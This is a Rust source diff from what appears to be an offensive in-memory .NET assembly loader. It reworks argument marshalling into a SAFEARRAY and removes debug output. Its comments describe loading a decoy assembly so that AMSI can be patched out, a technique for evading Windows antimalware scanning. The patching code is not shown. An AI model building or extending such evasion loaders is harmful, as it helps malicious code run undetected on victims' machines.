@@ -152,13 +152,12 @@ fn execute_dotnet_assembly(buf: &[u8], args: &[String]) -> Result<(), DotnetErro
     start_runtime(host)?;
     let app_domain = get_default_appdomain(host)?;
 
+    let p_args = make_params(args)?;
     let p_sa = create_safe_array(buf)?;
 
     // Create a junk decoy safe array such that we force a load of AMSI to then patch out
     let decoy_buf = [0x00, 0x00, 0x00, 0x01];
     let p_decoy_sa = create_safe_array(&decoy_buf)?;
-
-    let p_args = make_params(args)?;
 
     //
     // First load the decoy binary into the process; this is to bring in amsi.dll such that we can patch
@@ -178,12 +177,6 @@ fn execute_dotnet_assembly(buf: &[u8], args: &[String]) -> Result<(), DotnetErro
     let res = unsafe { load_3(app_domain as *mut _, p_sa, &mut sp_assembly) };
 
     if sp_assembly.is_null() {
-        #[cfg(debug_assertions)]
-        {
-            use shared::pretty_print::print_failed;
-            print_failed(&format!("Assembly ptr was null. Error: {res:#X}"));
-        }
-
         return Err(DotnetError::AssemblyDataNull);
     }
 
@@ -202,11 +195,6 @@ fn execute_dotnet_assembly(buf: &[u8], args: &[String]) -> Result<(), DotnetErro
     //
     let vt = unsafe { &(*(*entryp).vtable) };
     unsafe { (vt.Invoke_3)(entryp as *mut _, object, p_args, &mut retval) };
-
-    // TODO this is very wrong lol
-    println!("Ret val: {:?}", unsafe {
-        retval.Anonymous.Anonymous.Anonymous.intVal
-    });
 
     Ok(())
 }
@@ -237,12 +225,28 @@ fn make_params(args: &[String]) -> Result<*mut SAFEARRAY, DotnetError> {
     Ok(outer)
 }
 
+#[macro_export]
+macro_rules! put_string_in_array {
+    ($wide:expr, $p_sa:expr, $i:expr) => {{
+        let res = unsafe {
+            let p_str = SysAllocString($wide.as_ptr());
+            SafeArrayPutElement($p_sa, &$i as *const _ as *const i32, p_str as *const _)
+        };
+
+        if res != 0 {
+            return Err(DotnetError::ArgPutFailed(res));
+        }
+    }};
+}
+
 /// Converts arguments intended for the running assembly to a SAFEARRAY
 fn args_to_safe_array(args: &[String]) -> Result<*mut SAFEARRAY, DotnetError> {
-    let num_args = args.len();
+    let mut num_args = args.len();
+    let mut has_args = true;
 
     if num_args == 0 {
-        return Err(DotnetError::NoArgsInInput);
+        has_args = false;
+        num_args = 1;
     }
 
     if num_args > u32::MAX as usize {
@@ -255,16 +259,19 @@ fn args_to_safe_array(args: &[String]) -> Result<*mut SAFEARRAY, DotnetError> {
         return Err(DotnetError::SafeArrayNotInitialised);
     }
 
-    for (i, arg) in args.iter().enumerate() {
-        let wide: Vec<u16> = arg.encode_utf16().chain(once(0)).collect();
+    //
+    // If we have no args, just create an empty inner with 1 element, but 0 content.
+    // If we do have args, then iterate over them placing them properly in the array as an alloc'd WString
+    //
+    if !has_args {
+        let wide = vec![0u16];
+        let i = 0;
+        put_string_in_array!(wide, p_sa, i);
+    } else {
+        for (i, arg) in args.iter().enumerate() {
+            let wide: Vec<u16> = arg.encode_utf16().chain(once(0)).collect();
 
-        let res = unsafe {
-            let p_str = SysAllocString(wide.as_ptr());
-            SafeArrayPutElement(p_sa, &i as *const _ as *const _, p_str as *const _)
-        };
-
-        if res != 0 {
-            return Err(DotnetError::ArgPutFailed(res));
+            put_string_in_array!(wide, p_sa, i);
         }
     }
 
